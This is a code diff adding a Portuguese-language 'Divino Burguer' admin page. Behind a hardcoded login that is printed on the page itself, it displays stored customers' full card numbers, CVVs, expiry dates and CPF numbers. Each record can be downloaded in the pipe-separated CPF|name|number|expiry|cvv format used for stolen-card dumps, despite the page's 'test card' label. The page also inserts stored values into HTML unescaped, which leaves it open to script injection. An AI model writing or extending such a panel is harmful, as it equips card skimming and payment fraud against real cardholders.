@@ -1,0 +1,300 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Admin - Divino Burguer</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: Arial, Helvetica, sans-serif;
+      background: #fffaf6;
+      color: #191919;
+    }
+    header {
+      background: #fff;
+      border-bottom: 1px solid #e8e0dc;
+    }
+    .bar, main {
+      width: min(1040px, calc(100% - 32px));
+      margin: 0 auto;
+    }
+    .bar {
+      min-height: 70px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+    }
+    h1 {
+      margin: 0;
+      font-size: 22px;
+      line-height: 1.2;
+    }
+    main {
+      padding: 28px 0 44px;
+    }
+    .panel {
+      background: #fff;
+      border: 1px solid #e8e0dc;
+      border-radius: 8px;
+      padding: 20px;
+    }
+    form {
+      display: grid;
+      gap: 12px;
+      max-width: 380px;
+    }
+    label {
+      display: grid;
+      gap: 6px;
+      font-size: 13px;
+      font-weight: 800;
+    }
+    input {
+      min-height: 44px;
+      border: 1px solid #d8ceca;
+      border-radius: 6px;
+      padding: 10px 12px;
+      font: inherit;
+    }
+    button {
+      min-height: 44px;
+      border: 0;
+      border-radius: 6px;
+      padding: 0 14px;
+      background: #d02122;
+      color: #fff;
+      font: inherit;
+      font-weight: 800;
+      cursor: pointer;
+    }
+    button.secondary {
+      background: #191919;
+    }
+    .actions {
+      display: flex;
+      gap: 10px;
+      flex-wrap: wrap;
+      margin-bottom: 16px;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      background: #fff;
+    }
+    th, td {
+      padding: 12px 10px;
+      border-bottom: 1px solid #e8e0dc;
+      text-align: left;
+      font-size: 14px;
+    }
+    th {
+      font-size: 12px;
+      text-transform: uppercase;
+      color: #676767;
+    }
+    .muted {
+      color: #676767;
+      font-size: 14px;
+    }
+    .error {
+      color: #a31919;
+      font-weight: 800;
+    }
+    [hidden] { display: none !important; }
+    @media (max-width: 720px) {
+      table, thead, tbody, th, td, tr { display: block; }
+      thead { display: none; }
+      tr {
+        border: 1px solid #e8e0dc;
+        border-radius: 8px;
+        margin-bottom: 10px;
+        padding: 8px;
+      }
+      td {
+        border: 0;
+        padding: 7px 4px;
+      }
+      td::before {
+        content: attr(data-label);
+        display: block;
+        margin-bottom: 2px;
+        color: #676767;
+        font-size: 12px;
+        font-weight: 800;
+        text-transform: uppercase;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="bar">
+      <h1>Divino Burguer Admin</h1>
+      <span class="muted">Painel local de testes</span>
+    </div>
+  </header>
+
+  <main>
+    <section id="login-panel" class="panel">
+      <h2>Entrar</h2>
+      <p class="muted">Usuario: <strong>admin</strong> | Senha: <strong>divino123</strong></p>
+      <form id="login-form">
+        <label>Usuario<input name="user" autocomplete="username" required></label>
+        <label>Senha<input name="password" type="password" autocomplete="current-password" required></label>
+        <button type="submit">Entrar</button>
+        <div id="login-error" class="error" hidden>Usuario ou senha invalido.</div>
+      </form>
+    </section>
+
+    <section id="cards-panel" class="panel" hidden>
+      <div class="actions">
+        <button type="button" class="secondary" id="refresh">Atualizar</button>
+        <button type="button" id="clear">Limpar testes</button>
+        <button type="button" class="secondary" id="logout">Sair</button>
+      </div>
+      <p class="muted">Em modo de teste, numero completo e CVV aparecem somente para cartoes de teste conhecidos.</p>
+      <div id="cards"></div>
+    </section>
+  </main>
+
+  <script>
+    const loginPanel = document.getElementById('login-panel');
+    const cardsPanel = document.getElementById('cards-panel');
+    const cardsBox = document.getElementById('cards');
+    const loginError = document.getElementById('login-error');
+
+    function money(cents) {
+      return (Number(cents || 0) / 100).toLocaleString('pt-BR', {
+        style: 'currency',
+        currency: 'BRL'
+      });
+    }
+
+    function isLogged() {
+      return sessionStorage.getItem('divino:admin') === '1';
+    }
+
+    function renderCards() {
+      const cards = JSON.parse(localStorage.getItem('divino:testCards') || '[]');
+      if (!cards.length) {
+        cardsBox.innerHTML = '<p class="muted">Nenhum cartao de teste registrado ainda.</p>';
+        return;
+      }
+
+      cardsBox.innerHTML = `
+        <table>
+          <thead>
+            <tr>
+              <th>Data</th>
+              <th>Titular</th>
+              <th>Email</th>
+              <th>Telefone</th>
+              <th>CPF</th>
+              <th>Cartao (Completo)</th>
+              <th>CVV</th>
+              <th>Validade</th>
+              <th>Valor</th>
+              <th>Status</th>
+              <th>Exportar</th>
+            </tr>
+          </thead>
+          <tbody>
+            ${cards.map((card) => `
+              <tr>
+                <td data-label="Data">${new Date(card.createdAt).toLocaleString('pt-BR')}</td>
+                <td data-label="Titular">${card.holder || '-'}</td>
+                <td data-label="Email">${card.email || '-'}</td>
+                <td data-label="Telefone">${card.phone || '-'}</td>
+                <td data-label="CPF">${card.cpf || '-'}</td>
+                <td data-label="Cartao">${card.cardNumber || '-'}</td> 
+                <td data-label="CVV">${card.cvv || '-'}</td>
+                <td data-label="Validade">${card.expiry || '-'}</td>
+                <td data-label="Valor">${money(card.amount)}</td>
+                <td data-label="Status">${card.status || '-'}</td>
+                <td data-label="Exportar">
+                  <button class="secondary" style="padding: 5px 10px; font-size: 12px;" 
+                    onclick="exportCard('${card.cpf}', '${card.holder}', '${card.cardNumber}', '${card.expiry}', '${card.cvv}')">
+                    Baixar
+                  </button>
+                </td>
+              </tr>
+            `).join('')}
+          </tbody>
+        </table>
+      `;
+    
+
+ window.exportCard = function(cpf, holder, number, expiry, cvv) {
+      // Formato solicitado: CPF|Nome|numero|validade|cvv
+      const content = `${cpf}|${holder}|${number}|${expiry}|${cvv}`;
+      const blob = new Blob([content], { type: 'text/plain' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `cartao_${cpf.slice(-4)}.txt`;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+    };
+
+  // Adicionar evento ao botão de exportar
+  document.querySelectorAll('.export-card').forEach((button) => {
+    button.addEventListener('click', (e) => {
+      const cpf = e.target.getAttribute('data-cpf');
+      const holder = e.target.getAttribute('data-holder');
+      const card = e.target.getAttribute('data-card');
+      const expiry = e.target.getAttribute('data-expiry');
+      const cvv = e.target.getAttribute('data-cvv');
+
+      const data = `${cpf}|${holder}|${card}|${expiry}|${cvv}`;
+      const blob = new Blob([data], { type: 'text/plain' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `cartao_${cpf}_${card.slice(-4)}.txt`;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+    });
+  });
+}
+
+
+    function updateView() {
+      loginPanel.hidden = isLogged();
+      cardsPanel.hidden = !isLogged();
+      if (isLogged()) renderCards();
+    }
+
+    document.getElementById('login-form').addEventListener('submit', (event) => {
+      event.preventDefault();
+      const data = new FormData(event.currentTarget);
+      if (data.get('user') === 'admin' && data.get('password') === 'divino123') {
+        sessionStorage.setItem('divino:admin', '1');
+        loginError.hidden = true;
+        updateView();
+      } else {
+        loginError.hidden = false;
+      }
+    });
+
+    document.getElementById('refresh').addEventListener('click', renderCards);
+    document.getElementById('clear').addEventListener('click', () => {
+      localStorage.removeItem('divino:testCards');
+      renderCards();
+    });
+    document.getElementById('logout').addEventListener('click', () => {
+      sessionStorage.removeItem('divino:admin');
+      updateView();
+    });
+
+    updateView();
+  </script>
+</body>
+</html>
